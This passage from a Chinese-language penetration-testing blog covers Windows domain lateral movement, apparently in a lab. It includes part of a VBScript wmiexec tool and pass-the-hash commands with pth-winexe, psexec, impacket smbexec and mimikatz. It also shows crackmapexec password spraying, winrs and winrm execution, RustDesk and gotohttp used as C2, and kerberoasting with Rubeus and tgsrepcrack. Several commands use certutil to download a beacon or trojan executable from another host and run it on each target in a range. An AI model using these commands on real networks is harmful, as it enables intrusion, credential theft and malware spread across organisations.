class="string">&quot;WMIEXEC ERROR: Delete Share failed.&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Return value -&gt; &quot;</span> &amp; intReturn</span><br><span class="line">    <span class="keyword">Select</span> <span class="keyword">Case</span> intReturn</span><br><span class="line">    <span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Access Denied!&quot;</span></span><br><span class="line">    <span class="keyword">Case</span> <span class="number">25</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Share Not Exists!&quot;</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC : Share deleted sucess.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Exec(cmd, file)</span><br><span class="line"><span class="keyword">Set</span> objStartup = objWMIService.<span class="keyword">Get</span>(<span class="string">&quot;Win32_ProcessStartup&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> objConfig = objStartup.SpawnInstance_</span><br><span class="line">objConfig.ShowWindow = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Set</span> objProcess=objWMIService.<span class="keyword">get</span>(<span class="string">&quot;Win32_Process&quot;</span>)</span><br><span class="line">strExec = <span class="string">&quot;cmd.exe /c &quot;</span> &amp; cmd &amp; <span class="string">&quot; &gt; &quot;</span> &amp; file &amp; <span class="string">&quot; 2&gt;&amp;1&quot;</span>  <span class="comment">&#x27;2&gt;&amp;1 err</span></span><br><span class="line"><span class="keyword">If</span> boolPersist <span class="keyword">Then</span></span><br><span class="line">strExec = cmd</span><br><span class="line">intPath = <span class="built_in">InStr</span>(cmd,<span class="string">&quot;\&quot;</span>)</span><br><span class="line"><span class="keyword">If</span> intPath = <span class="number">0</span> <span class="keyword">Then</span> strExec = CurrentFolder &amp; <span class="string">&quot;\&quot;</span> &amp; strExec</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="comment">&#x27;WScript.Echo strExec</span></span><br><span class="line">intReturn = objProcess.Create _</span><br><span class="line">    (strExec, CurrentFolder, objConfig, intProcessID)  <span class="comment">&#x27;Add CurrentFolder (strExec, Null, objConfig, intProcessID)</span></span><br><span class="line"><span class="keyword">If</span> intReturn &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Process could not be created.&quot;</span> &amp; _</span><br><span class="line">        vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Command -&gt; &quot;</span> &amp; cmd &amp; _</span><br><span class="line">        vbNewLine &amp; <span class="string">&quot;WMIEXEC ERROR: Return value -&gt; &quot;</span> &amp; intReturn</span><br><span class="line">    <span class="keyword">Select</span> <span class="keyword">Case</span> intReturn</span><br><span class="line">    <span class="keyword">Case</span> <span class="number">2</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Access Denied!&quot;</span></span><br><span class="line"><span class="keyword">Case</span> <span class="number">3</span></span><br><span class="line">WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Insufficient Privilege!&quot;</span></span><br><span class="line">    <span class="keyword">Case</span> <span class="number">9</span></span><br><span class="line">    WScript.Echo <span class="string">&quot;WMIEXEC ERROR: Path Not Found!&quot;</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">Select</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line"><span class="comment">&#x27;    WScript.Echo &quot;Process created.&quot; &amp; _</span></span><br><span class="line"><span class="comment">&#x27;        vbNewLine &amp; &quot;Command: &quot; &amp; cmd &amp; _</span></span><br><span class="line"><span class="comment">&#x27;        vbNewLine &amp; &quot;Process ID: &quot; &amp; intProcessID</span></span><br><span class="line"><span class="keyword">If</span> boolPersist <span class="keyword">Then</span> WScript.Echo <span class="string">&quot;WMIEXEC : Process created. PID: &quot;</span>&amp; intProcessID</span><br><span class="line">    <span class="keyword">If</span> boolGetFolder = <span class="literal">True</span> <span class="keyword">Then</span> </span><br><span class="line">    boolGetFolder = <span class="literal">False</span></span><br><span class="line">    Exec = GetCurrentFolder()</span><br><span class="line">    <span class="keyword">Exit</span> <span class="keyword">Function</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="comment">&#x27;ReadResult()</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> ReadResult()</span><br><span class="line">WScript.Sleep(WAITTIME)</span><br><span class="line">UNCFilePath = <span class="string">&quot;\\&quot;</span> &amp; host &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="string">&quot;WMI_SHARE&quot;</span> &amp; <span class="string">&quot;\&quot;</span> &amp; FileName</span><br><span class="line"><span class="keyword">Set</span> fso = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> objFile = fso.OpenTextFile(UNCFilePath, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">If</span> <span class="keyword">Not</span> objFile.AtEndOfStream <span class="keyword">Then</span> strContents = objFile.ReadAll</span><br><span class="line">objFile.Close</span><br><span class="line">WScript.Echo strContents</span><br><span class="line"><span class="comment">&#x27;fso.DeleteFile(UNCFilePath)   win2008 fso has no privilege to delete file on share folder</span></span><br><span class="line">strDelFile = <span class="string">&quot;del &quot;</span> &amp; file &amp; <span class="string">&quot; /F&quot;</span></span><br><span class="line">Exec strDelFile,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> GetCurrentFolder()</span><br><span class="line">WScript.Sleep(WAITTIME)</span><br><span class="line">UNCFilePath = <span class="string">&quot;\\&quot;</span> &amp; host &amp; <span class="string">&quot;\&quot;</span> &amp; <span class="string">&quot;WMI_SHARE&quot;</span> &amp; <span class="string">&quot;\&quot;</span> &amp; FileName</span><br><span class="line"><span class="keyword">Set</span> fso = <span class="built_in">CreateObject</span>(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> objFile = fso.OpenTextFile(UNCFilePath, <span class="number">1</span>)</span><br><span class="line">GetCurrentFolder = objFile.ReadLine</span><br><span class="line">objFile.Close</span><br><span class="line">strDelFile = <span class="string">&quot;del &quot;</span> &amp; file &amp; <span class="string">&quot; /F&quot;</span></span><br><span class="line">Exec strDelFile,<span class="string">&quot;nul&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure><p>把脚本上传到目标服务器</p><p><code>cscript //nologo wmiexec.vbs /shell 192.168.3.21 administrator Admin12345</code></p><p><img src="https://bu.dusays.com/2024/10/11/6709336104d7b.png" alt="image-20240914132534035"></p><p>可以看到会生成一个交互式shell 且与3.21(DC)交互</p><p><strong>有一个问题就是CS不支持交互式shell</strong></p><p>所以这个脚本利用面比较窄</p><h3 id="kali自带pth执行"><a href="#kali自带pth执行" class="headerlink" title="kali自带pth执行"></a>kali自带pth执行</h3><p>工作组环境下（本地管理员）：</p><p><code>pth-winexe  -U administrator%Aatest --system --ostype=1 //192.168.3.90 cmd</code></p><p><img src="https://bu.dusays.com/2024/10/11/670933be25b92.png" alt="image-20240914133847869"></p><p>域环境下（域管用户）：</p><p><code>pth-winexe  -U ggyao/administrator%Aatest --system --ostype=1 //192.168.3.90 cmd</code></p><p><img src="https://bu.dusays.com/2024/10/11/670933bdc64a1.png" alt="image-20240914133930069"></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>SMB是文件共享服务 通过<strong>445端口</strong>进行的</p><p><img src="https://bu.dusays.com/2024/10/11/670933b33a8d4.png" alt="image-20240918182113450"></p><p>可以直接用CS的端口扫描看下445端口开没开</p><p><img src="https://bu.dusays.com/2024/10/11/670933b324fcb.png" alt="image-20240918182221751"></p><p>同样 它也是支持hash和明文传递的</p><h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>PsExec是微软官方提供的一个Windows远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性</p><p>PsExec的原理是通过SMB连接到服务端的<code>Admin$</code>共享，并释放名为”psexecsvc.exe”的二进制文件，然后注册名为”PSEXECSVC”服务。当客户端执行命令时，服务端通过PSEXECSVC服务启动相应的程序执行命令并回显数据。运行结束后，PSEXECSVC服务会被删除。</p><p>使用PSEXEC进行远程操作需要以下条件：</p><p>1、远程主机开启了<code>Admin$</code>共享</p><p>2、远程主机未开启防火墙或放行了<strong>445端口</strong></p><p>用微软自带工具 可以绕过免杀</p><p>PStools</p><p>直接到微软官网上去下就行</p><p><img src="https://bu.dusays.com/2024/10/11/670933b32235e.png" alt="image-20240918182618330"></p><p>因为它也是shell的形式</p><p>用CS不太行</p><p>所以我们用socks节点打过去</p><p><code>psexec64 \\192.168.3.32 -u administrator -p admin!@#45 -s cmd</code></p><p><img src="https://bu.dusays.com/2024/10/11/670933b8a4a3f.png" alt="image-20240918183243824"></p><h3 id="impacket套件"><a href="#impacket套件" class="headerlink" title="impacket套件"></a>impacket套件</h3><p><img src="https://bu.dusays.com/2024/10/11/670933b323eee.png" alt="image-20240918184038910"></p><p><code>psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</code></p><p><code>psexec -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.32</code></p><p>还是走socks代理比较好</p><p>我这里好像代理一直有点问题</p><p>一直拒绝访问</p><p>但是命令是没问题的</p><p><img src="https://bu.dusays.com/2024/10/11/670933b59e65a.png" alt="image-20240918184234171"></p><p>呃 又好了</p><p><img src="https://bu.dusays.com/2024/10/11/670933c2b42ac.png" alt="image-20240918184436101"></p><h3 id="SMBexec"><a href="#SMBexec" class="headerlink" title="SMBexec"></a>SMBexec</h3><p>同样是用impacket中的来</p><p>里面有一个SMBexec</p><p><code>smbexec ./administrator:admin!@#45@192.168.3.32</code></p><p><code>smbexec god/administrator:Admin12345@192.168.3.32</code></p><p><code>smbexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.32</code></p><p><code>smbexec -hashes :518b98ad4178a53695dc997aa02d455c god/administrator@192.168.3.32</code></p><p><code>smbexec -hashes god/administrator:518b98ad4178a53695dc997aa02d455c@192.168.3.32</code></p><p><img src="https://bu.dusays.com/2024/10/11/670933c1b1e7b.png" alt="image-20240918185242679"></p><p><strong>只要能执行命令，那么就可以通过下载执行木马的形式执行对应的木马</strong></p><h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>尝试使用已经获取的hash已经明文密码，对于域内所有主机进行相应的登录尝试 这就是密码喷洒</p><p>工具：</p><p><a href="https://github.com/Porchetta-Industries/CrackMapExec">crackmapexec</a></p><p>下载命令</p><p><code>apt-get install crackmapexec</code></p><h3 id="linux代理"><a href="#linux代理" class="headerlink" title="linux代理"></a>linux代理</h3><p>需要下载proxychain</p><p><code>apt install proxychains</code> </p><p><img src="https://bu.dusays.com/2024/10/11/670933c3dc42b.png" alt="image-20240918190902840"></p><p>好 然后我们需要配置一下</p><p><code>proxychains ping www.baidu.com</code></p><p><img src="https://bu.dusays.com/2024/10/11/670933c287b43.png" alt="image-20240918191139602"></p><p>找到配置文件地址</p><p>&#x2F;etc&#x2F;proxychains.conf</p><p>编辑</p><p><code>vi /etc/proxychains.conf</code></p><p><img src="https://bu.dusays.com/2024/10/11/670933b49bfab.png" alt="image-20240918191400753"></p><p>这里是127.0.0.1是因为我们CS服务端在本地</p><p>而win下的配置是我kali的IP</p><p>我们把它的端口改成CS的socks代理的端口</p><p>然后就可以来下载crackmapexec</p><p><img src="https://bu.dusays.com/2024/10/11/670933c480ab4.png" alt="image-20240918194113112"></p><p>crackmapexec -h</p><p><img src="https://bu.dusays.com/2024/10/11/670933c32d6d5.png" alt="image-20240918194600320"></p><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="密码喷洒域登录"><a href="#密码喷洒域登录" class="headerlink" title="密码喷洒域登录"></a>密码喷洒域登录</h4><p><code>crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39;</code></p><p>但是我们不能直接在kali上用</p><p>因为kali和域内主机不在同网段连不上</p><p>所以我们必须用socks代理</p><p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39;</code></p><p>这样就行</p><p><img src="https://bu.dusays.com/2024/10/11/670933bfb4c5e.png" alt="image-20240918202254922"></p><p>登不上去</p><h4 id="本地登录"><a href="#本地登录" class="headerlink" title="本地登录"></a>本地登录</h4><p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39; --local-auth</code></p><p>多了一个–local-auth</p><p><img src="https://bu.dusays.com/2024/10/11/670933b68324f.png" alt="image-20240918202202687"></p><p>登录成功会有这个绿色的+</p><h4 id="本地登录执行命令"><a href="#本地登录执行命令" class="headerlink" title="本地登录执行命令"></a>本地登录执行命令</h4><p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39; -x &#39;whoami&#39; --local-auth</code></p><p>多了一个<code>-x &#39;whoami&#39;</code></p><p><img src="https://bu.dusays.com/2024/10/11/670933b5420d5.png" alt="image-20240918202508005"></p><p>他会在最后把所以能执行命令的主机的执行结果汇总</p><p><strong>本地登录命令执行上线</strong></p><p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39; -x &#39;certutil -urlcache -split -f http://192.168.3.31/xxx.exe &amp; c:/4455.exe&#39; --local-auth</code></p><p>就是把whoami改成一个下载命令再执行</p><p>也可进行爆破</p><p>就是把-u 和-p后面跟上字典就像</p><p><strong>密码喷洒域登录命令执行上线</strong></p><p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p &#39;admin!@#45&#39; -x &#39;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe &amp; c:/4455.exe&#39;</code></p><p>少了一个–local-auth</p><p><strong>密码喷洒本地&amp;域登录命令执行全自动上线：</strong></p><p>域</p><p><code>proxychains crackmapexec smb 192.168.3.21-32 -u user.txt -p pass.txt -x &#39;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe &amp; c:/4455.exe&#39;</code></p><p>本地</p><p><code>proxychains crackmapexec smb 192.168.3.21-32 -u administrator -p pass.txt -x &#39;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/4455.exe c:/4455.exe &amp; c:/4455.exe&#39; --local-auth</code></p><h2 id="WinRM"><a href="#WinRM" class="headerlink" title="WinRM"></a>WinRM</h2><p>WinRM(Windows Remote Management)是 Microsoft 对 WS-Management 协议的实现，WS-Management 协议即一种基于标准简单对象访问协议（soap）的防火墙友好协议，它让来自不同供应商的硬件和操作系统能够相互操作。windows 众多可以远程执行命令方式中的一种。</p><p>作为DCOM和WMI远程管理的替代方法，WinRM用于通过WSMan与远程计算机建立会话，WSMan利用HTTP&#x2F;S作为传输机制来传递XML格式的消息。在现代Windows系统中，WinRM HTTP通过TCP<strong>端口5985</strong>进行通信，而HTTPS（TLS）通过TCP端口5986进行通信。</p><p><strong>WinRM: windows远程管理，是一种允许管理员远程执行系统管理任务的服务</strong></p><blockquote><p>2008 以上  默认是自动   Win7以上手动启动</p><p>win 2012  默认都是允许远程任意主机进行管理</p></blockquote><p>查询本机的WinRM状态:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell Get-WmiObject -Class win32_service | Where-Object &#123;$_.name -like &quot;WinRM&quot;&#125;</span><br></pre></td></tr></table></figure><p>开启WinRM服务:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm quickconfig -q    #自动添加防火墙例外规则，放行5985端口。</span><br><span class="line"></span><br><span class="line">winrm set winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure><p>扫描一下5985端口</p><p><img src="https://bu.dusays.com/2024/10/11/670933b5f0f1e.png" alt="image-20240925232433383"></p><p><img src="https://bu.dusays.com/2024/10/11/670933b3bed06.png" alt="image-20240925232538267"></p><p>也就是DC、webserver、sqlserver三台主机开了5985端口</p><p>Windows远程管理工具提供了两个命令行工具用于远程管理</p><ul><li><p>Winrs，允许远程执行命令的命令行工具，利用WS-Management协议</p></li><li><p>Winrm(Winrm.cmd),内置系统管理命令行工具，允许管理员配置本机的WinRM服务</p></li></ul><h3 id="Winrs"><a href="#Winrs" class="headerlink" title="Winrs"></a>Winrs</h3><p>所以执行命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 whoami</span><br><span class="line"></span><br><span class="line">winrs -r:192.168.3.21 -u:192.168.3.21\administrator -p:Admin12345 whoami</span><br></pre></td></tr></table></figure><p>咦 CS报错</p><p><img src="https://bu.dusays.com/2024/10/11/670933b2af196.png" alt="image-20240925233032029"></p><p>排查了很久</p><p>感觉可能是shell的问题 </p><p>但是在主机内是可以执行的</p><p><img src="https://bu.dusays.com/2024/10/11/670933b336af0.png" alt="image-20240925233129350"></p><p>那我们用cmd就行</p><p>也就是cs转给msf</p><p>在msf里shell</p><p>然后运行cmd </p><p>在cmd里执行命令就行</p><p>既然可以执行任意命令 那么我们就可以让他远程下载木马并执行 这样就可以上线了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrs -r:192.168.3.32 -u:192.168.3.32\administrator -p:admin!@#45 &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/beacon.exe c:\beacon.exe &amp; c:\beacon.exe&quot;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933b37dcec.png" alt="image-20240925233901855"></p><p>把生成的正向木马放到webserver的目录里</p><p><img src="https://bu.dusays.com/2024/10/11/670933b496aa5.png" alt="image-20240925234046683"></p><p>执行命令</p><p><img src="https://bu.dusays.com/2024/10/11/670933b3bcad5.png" alt="image-20240925234218444"></p><p>sqlserver已下载beacon.exe并成功执行</p><p><img src="https://bu.dusays.com/2024/10/11/670933bdc4b22.png" alt="image-20240925234310415"></p><p>上线了就简单了</p><p>因为是正向连接  所以我们要绑定一下端口</p><p><img src="https://bu.dusays.com/2024/10/11/670933b321aa2.png" alt="image-20240925234430309"></p><p>然后就会上线了</p><p>cs本身可以直接WinRM</p><p><img src="https://bu.dusays.com/2024/10/11/670933b417e0d.png" alt="image-20240925234650300"></p><h3 id="Winrm"><a href="#Winrm" class="headerlink" title="Winrm"></a>Winrm</h3><p>生成一个计算器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell winrm invoke Create wmicimv2/win32_process @&#123;CommandLine=&quot;calc.exe&quot;&#125; -r:192.168.30.10 -u:Administrator -p:uu2fu3o@admin</span><br></pre></td></tr></table></figure><p>当然也可以生成服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#生成名为test的服务</span><br><span class="line">winrm invoke Create wmicimv2/Win32_Service @&#123;Name=&quot;test&quot;;DisplayName=&quot;test&quot;;PathName=&quot;cmd.exe /k c:\windows\system32\calc.exe&quot;&#125; -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin</span><br></pre></td></tr></table></figure><p>远程调用该服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winrm invoke StartService wmicimv2/Win32_Service?Name=test -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin</span><br></pre></td></tr></table></figure><p>执行SMB匿名服务器中的后门文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell winrm invoke Create wmicimv2/Win32_Service @&#123;Name=&quot;test2&quot;;DisplayName=&quot;test2&quot;;PathName=&quot;cmd.exe /k \\192.168.30.20\smb\Winrm.exe&quot;&#125; -r:http://192.168.30.10:5985 -u:Administrator -p:uu2fu3o@admin</span><br></pre></td></tr></table></figure><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>rdp就是远程桌面协议  默认监听端口为3389，通过已获得的凭据进行代理登录远程主机并进行实时操控</p><p>但是可能导致对方用户强行下线，易被发现</p><p>还是先看看开没开3389</p><p><img src="https://bu.dusays.com/2024/10/11/670933b31f48c.png" alt="image-20240926000935064"></p><p><img src="https://bu.dusays.com/2024/10/11/670933b2f143a.png" alt="image-20240926001000955"></p><p><strong>RDP连接不仅支持明文，也支持hash连接</strong></p><p>CS的桌面交换其实就是基于RDP的</p><p><img src="https://bu.dusays.com/2024/10/11/670933bcd0d1d.png" alt="image-20240926001313288"></p><p>window本身的mstsc也是一样的</p><p><img src="https://bu.dusays.com/2024/10/11/670933b2d6fdf.png" alt="image-20240926001424727"></p><p><img src="https://bu.dusays.com/2024/10/11/670933b30095e.png" alt="image-20240926001440656"></p><p>这些都是明文连接</p><p>hash连接</p><p>要mimikatz抓下密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz privilege::debug   #要管理员权限</span><br><span class="line"></span><br><span class="line">mimikatz sekurlsa::pth /user:administrator /domain:192.168.3.32 /ntlm:518b98ad4178a53695dc997aa02d455c &quot;/run:mstsc.exe /restrictedadmin&quot;</span><br></pre></td></tr></table></figure><h2 id="C2横向"><a href="#C2横向" class="headerlink" title="C2横向"></a>C2横向</h2><p>C2, Command and Control, 命令与控制。主要是指攻击者通过与恶意软件的交互，对被害者进行控制，从而实施恶意活动的含义</p><p>下面这两个都是远程协助软件</p><h3 id="gotohttp"><a href="#gotohttp" class="headerlink" title="gotohttp"></a>gotohttp</h3><p><strong>gotohttp走的是https协议</strong></p><p>目标网络情况：</p><p>1、能出网，没有限制    #能直接用</p><p>2、能出网、有限制（xx端口，不限制https就行）</p><p>3、不出网、有限制（不限制https就行）</p><p>优点：B2C模式–&gt;<strong>不需要安装软件 有浏览器就行</strong></p><p>走的是https协议，只要放行443端口就可以实现内网穿透</p><p>缺点：</p><p>必须要有网络，不限制https</p><p>网络唤醒远程主机的时候，安全卫士可能拦截</p><p>我们需要把文件放到目标主机上</p><p>方法很多 就不多说了</p><p><img src="https://bu.dusays.com/2024/10/11/670933e1ca7d7.png" alt="image-20240926004902922"></p><p>可以看到很小</p><p>运行程序</p><p>会生成控制码于ID</p><p><img src="https://bu.dusays.com/2024/10/11/670933e24058d.png" alt="image-20240926005026067"></p><p>这个软件在开完后会在当前路径中生成一个配置文件路径</p><p><img src="https://bu.dusays.com/2024/10/11/670933e1a73c6.png" alt="image-20240926005205338"></p><p>里面有我们需要的信息</p><p><img src="https://bu.dusays.com/2024/10/11/670933e269919.png" alt="image-20240926005238378"></p><p>直接通过它给的这个host连接</p><p>浏览器访问</p><p><img src="https://bu.dusays.com/2024/10/11/670933e6ec7a0.png" alt="image-20240926010553357"></p><p>连接</p><p><img src="https://bu.dusays.com/2024/10/11/670933e25a1e4.png" alt="image-20240926010910286"></p><p>连上了</p><p><img src="https://bu.dusays.com/2024/10/11/670933e26aa30.png" alt="image-20240926011402624"></p><h3 id="RustDesk"><a href="#RustDesk" class="headerlink" title="RustDesk"></a>RustDesk</h3><p><a href="https://github.com/rustdesk/rustdesk">RustDesk</a></p><p>优点：无网络（不出网）情况下也可以用</p><p>把rustdesk传入目标电脑</p><p>因为这是一个远程协助的工具 所以会被杀软列入白名单 </p><p>同样 他也会有配置文件</p><p>本地存放路径：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\用户名\AppData\Roaming\RustDesk\config\RustDesk.toml</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933e36024e.png" alt="image-20240927202509291"></p><p><img src="https://bu.dusays.com/2024/10/11/670933e856099.png" alt="image-20240927202542779"></p><p>配置文件</p><p><img src="https://bu.dusays.com/2024/10/11/670933e41885a.png" alt="image-20240927202612230"></p><p>enc_id就是id</p><p>salt就是密码</p><p>如果是出网的情况下</p><p>我们就直接在本地开一个客户端进行远连就行</p><p><img src="https://bu.dusays.com/2024/10/11/670933e7cfa77.png" alt="image-20240927202740939"></p><p>如果是不出网的话</p><p>我们只需要找一个能与他进行通信的主机就可以了</p><p>我们选哟更改一下配置文件</p><p><img src="https://bu.dusays.com/2024/10/11/670933e532720.png" alt="image-20240927203058574"></p><p>添加</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">direct-server = &#x27;Y&#x27;</span><br><span class="line"></span><br><span class="line">direct-access-port = &#x27;8443&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933e5addf3.png" alt="image-20240927203216208"></p><p>我们直接用同网段的主机连ip就行</p><p><img src="https://bu.dusays.com/2024/10/11/670933e3199ca.png" alt="image-20240927203447919"></p><p>注意配置文件里的local-ip-addr要是真ip–&gt;192.168.3.32</p><p><img src="https://bu.dusays.com/2024/10/11/670933e4c334e.png" alt="image-20240927203712819"></p><h2 id="kerberos协议"><a href="#kerberos协议" class="headerlink" title="kerberos协议"></a>kerberos协议</h2><h4 id="简单学习"><a href="#简单学习" class="headerlink" title="简单学习"></a>简单学习</h4><p><a href="https://juejin.cn/post/6844903955416219661">kerberos学习</a></p><p><a href="https://blog.51cto.com/u_16242301/7297870">windows认证学习</a></p><p>简单理解</p><p><img src="https://bu.dusays.com/2024/10/11/670933e3d5f88.png" alt="image-20240927205855549"></p><p>当你在进行Hadoop安全访问时 就会用到kerberos协议</p><p>认证服务器在验证Client身份后会发一张票证(TGT)</p><p>Client将TGT交给票据授权服务器 通过后会通过TGT获取访问Server端的票据(ST)</p><p>这样就可以正常访问了</p><h4 id="kerberoasting攻击"><a href="#kerberoasting攻击" class="headerlink" title="kerberoasting攻击"></a>kerberoasting攻击</h4><p>SPN扫描</p><p>SPN：服务主体名称 他是域内服务的唯一标识 每一个服务，都会有一个SPN ，服务在加入域的时候，也会自动注册一个SPN</p><p>mysql、http、rdp都会有对应的SPN</p><p>使用场景：我们在没有办法获取到域内其他主机的凭据信息(mimikatz抓不到)时，就可以采用kerberoasting</p><p>也就是 请求对应的服务，获取服务的凭据(抓SPN凭据)，再将服务凭据导入本地进行破解</p><p>凭据加密类型rc4</p><p>SPN扫描：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setspn -T god.org -q */*   #扫全部</span><br><span class="line"></span><br><span class="line">setspn -T god.org -q */* | findstr &quot;MSSQL&quot;  #扫MSSQL</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933f19e35e.png" alt="image-20240927212603953"></p><p>工具检测：</p><p>Rubeus</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus kerberoast</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933e25ae7c.png" alt="image-20240927214421084"></p><p>把这个文件放到目标主机上</p><p>然后执行命令就行</p><p><img src="https://bu.dusays.com/2024/10/11/670933f5a75bc.png" alt="image-20240927214925634"></p><p>这样我们就直接找到了凭据加密类型是rc4的SPN</p><p>先请求到票据</p><p>查看票据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933f250b64.png" alt="image-20240927215318596"></p><p>但是现在这些票据都不是我们需要的</p><p>清除票据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">klist purge</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933e26fcec.png" alt="image-20240927215455023"></p><p>mimikatz请求SPN</p><p><img src="https://bu.dusays.com/2024/10/11/670933e47bfa8.png" alt="image-20240927215632909"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kerberos::ask /target:MSSQLSvc/Srv-DB-0day.0day.org:1433</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933f0ad154.png" alt="image-20240927215727486"></p><p>好</p><p>退出</p><p>我们再看看票据</p><p><img src="https://bu.dusays.com/2024/10/11/670933f0cc01b.png" alt="image-20240927215825606"></p><p>已经有新票证生成</p><p>第一个票证是AES加密的 我们用不了</p><p>第二个就是RC4加密的 可用</p><p>mimikatz导出票据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz kerberos::list /export</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/10/11/670933f210e93.png" alt="image-20240927220015285"></p><p>它会把票证导到mimikatz的路径下</p><p><img src="https://bu.dusays.com/2024/10/11/670933e97d873.png" alt="image-20240927220058200"></p><p>把我们需要的票证放到kerberaost的文件夹里</p><p><img src="https://bu.dusays.com/2024/10/11/670933e8dd247.png" alt="image-20240927220233464"></p><p>直接用它内置的脚本+凭证名</p><p><img src="https://bu.dusays.com/2024/10/11/670933f32f553.png" alt="image-20240927220442507"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python tgsrepcrack.py 字典名 &quot;凭证名&quot;</span><br></pre></td></tr></table></figure><p>pass.txt是一个字典</p><h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><h3 id="前置"><a href="#前置" class="headerlink" 